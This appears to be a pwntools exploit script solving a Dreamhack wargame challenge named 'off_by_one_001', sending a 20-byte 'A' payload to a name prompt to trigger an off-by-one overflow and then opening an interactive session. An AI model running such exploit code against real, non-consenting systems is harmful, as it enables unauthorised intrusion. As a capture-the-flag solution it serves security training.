from pwn import *
import sys

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('host1.dreamhack.games',24306)
elif sys.argv[1]=="-l":
    p = process('off_by_one_001')

payload="A"*20

p.sendlineafter("Name: ",payload)

p.interactive()